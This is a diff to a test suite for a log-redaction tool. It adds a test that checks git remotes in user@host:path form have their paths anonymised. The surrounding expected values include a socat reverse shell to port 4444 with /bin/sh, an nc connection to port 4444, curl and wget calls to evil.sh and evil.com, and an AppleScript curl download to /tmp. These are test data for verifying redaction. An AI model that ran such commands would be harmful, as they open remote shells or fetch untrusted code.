@@ -2114,7 +2114,8 @@ describe.skipIf(!fs.existsSync(JQ))('hosts', () => {
     expect(h.get('Janes-MacBook-Pro')).toBe('host1.internal.invalid');
     expect(args[0]).toEqual(['open', `https://${h.get('wiki.acme.com')}/${keyed(r.key, 'name').get('x')}`]);
     expect(args[1]).toEqual(['ssh', h.get('build01.corp')]);
-    expect(args[2]![2]).toBe(`git@${h.get('git.acme.com')}:team/repo.git`);
+    // git's scp form: the path is cleaned as the same remote's URL path would be.
+    expect(args[2]![2]).toBe(`git@${h.get('git.acme.com')}:${keyed(r.key, 'name').get('team')}/${keyed(r.key, 'name').get('repo.git')}`);
     expect(args[3]).toEqual(['nc', h.get('10.0.0.5'), '4444']);
     expect(ev[3]!.event.exec.env).toContain('HTTP_PROXY=<redacted>');
     expect(args[4]![2]).toBe(`ping -c1 ${h.get('192.168.1.20')} && ssh admin@${h.get('nas.home.arpa')} uptime; ping6 ${h.get('fe80::1')}%en0; scp x deploy@${h.get('buildbox')}:/srv/`);
@@ -2263,7 +2264,7 @@ describe.skipIf(!fs.existsSync(JQ))('hosts', () => {
     expect(args[2]).toEqual(['socat', `TCP:${h.get('10.0.0.6')}:4444`, 'EXEC:/bin/sh']);
     expect(args[3]).toEqual(['curl', '--resolve', `h:443:${h.get('10.0.0.7')}`, '-o', '/dev/null', `https://${h.get('h')}/`]);
     expect(args[4]).toEqual(['mysql', `-h${h.get('10.0.0.8')}`]);
-    expect(args[5]![2]).toBe(`ssh -p 22 admin@${h.get('buildbox')} mail person2@example.invalid; scp f deploy@${h.get('buildbox')}:/srv/; git clone git@git.example.com:team/r.git`);
+    expect(args[5]![2]).toBe(`ssh -p 22 admin@${h.get('buildbox')} mail person2@example.invalid; scp f deploy@${h.get('buildbox')}:/srv/; git clone git@git.example.com:${n.get('team')}/${n.get('r.git')}`);
     expect(args[6]![2]).toBe(`curl evil.sh; wget evil.sh/${n.get('a')}; curl evil.com/tmp/${n.get('b')}`);
     expect(args.slice(7, 10)).toEqual([['curl', 'evil.sh'], ['wget', `evil.sh/${n.get('a')}`], ['curl', `evil.com/tmp/${n.get('b')}`]]);
     expect(args[10]![2]).toBe(`do shell script "curl ${h.get('intranet')}/${n.get('a.sh')} -o /tmp/${n.get('x')}"`);
@@ -2471,6 +2472,35 @@ describe.skipIf(!fs.existsSync(JQ))('hosts', () => {
     const n = keyed(r.key, 'name');
     expect(events(r.out)[0]!.event.exec.args).toEqual(['curl', '-o', '/dev/null', `https://evil.example.net/${n.get('a')}/${n.get('b@c.com')}`]);
     expect(r.summary['redacted']).toBe('1');
+  });
+
+  // git's scp form (user@host:path) names the same repository as its https form: its path is cleaned the same way.
+  test('a git remote in user@host:path form has its path cleaned like the same remote\'s URL', () => {
+    const scp = 'git@github.com:acme-corp/falcon-dataroom.git';
+    const https = 'https://github.com/acme-corp/falcon-dataroom.git';
+    const input = [
+      run(1270, '/usr/bin/git', ['git', 'clone', scp], '/', 1),
+      run(1271, '/usr/bin/git', ['git', 'clone', https], '/', 2),
+      run(1272, '/usr/bin/git', ['git', 'remote', 'add', 'origin', 'git@git.acme.corp:hr/comp.git'], '/', 3),
+      run(1273, '/bin/sh', ['sh', '-c', `git clone ${scp} && cd falcon-dataroom`], '/', 4),
+      // An absolute path on the other side keeps today's reading (a path on that machine), for scp and git alike.
+      run(1274, '/usr/bin/scp', ['scp', 'notes.txt', 'jane@10.1.2.3:/srv/drop/'], '/', 5),
+    ].join('\n') + '\n';
+    const r = runClean(['clean', '-o', '-'], { input });
+    expect(r.status, r.stderr).toBe(0);
+    const args = events(r.out).map(e => e.event.exec.args as string[]);
+    const n = keyed(r.key, 'name');
+    const org = n.get('acme-corp');
+    const repo = n.get('falcon-dataroom.git');
+    expect(org).toMatch(/^name\d+$/);
+    expect(repo).toMatch(/^name\d+$/);
+    expect(args[0]).toEqual(['git', 'clone', `git@github.com:${org}/${repo}`]);
+    expect(args[1]).toEqual(['git', 'clone', `https://github.com/${org}/${repo}`]);
+    expect(args[2]![4]).toMatch(/^git@host\d+\.internal\.invalid:name\d+\/name\d+$/);
+    expect(args[3]![2]).toBe(`git clone git@github.com:${org}/${repo} && cd falcon-dataroom`);
+    expect(args[4]).toEqual(['scp', 'notes.txt', `jane@${keyed(r.key, 'host').get('10.1.2.3')}:/srv/drop/`]);
+    for (const v of ['acme-corp', 'falcon-dataroom', 'hr/', 'comp.git']) expect(r.out, v).not.toContain(v.startsWith('falcon') ? `${v}.git` : v);
+    sameFindings(input, r.out);
   });
 });
 
